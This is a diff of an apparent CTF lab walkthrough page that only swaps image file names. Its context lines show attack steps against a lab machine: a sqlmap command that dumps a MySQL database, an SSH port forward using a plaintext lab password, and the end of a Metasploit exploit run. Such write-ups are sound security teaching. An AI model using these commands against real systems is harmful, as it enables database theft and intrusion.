@@ -35,7 +35,7 @@ Saved the request into a file called request.txt, if you highlight everything an
 sqlmap -r request.txt --dbms=mysql --dump
 ```
 
-<figure><img src="../../.gitbook/assets/image (7) (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
 
 **In the users table, what is the hashed password?**
 
@@ -98,7 +98,7 @@ ssh -L 10000:localhost:10000 agent47@10.10.74.145
 Password: videogamer124
 ```
 
-<figure><img src="../../.gitbook/assets/image (24).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (24) (2).png" alt=""><figcaption></figcaption></figure>
 
 **What is the CMS version?**
 
@@ -132,4 +132,4 @@ set lport 443
 exploit
 ```
 
-<figure><img src="../../.gitbook/assets/image (3) (1) (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>
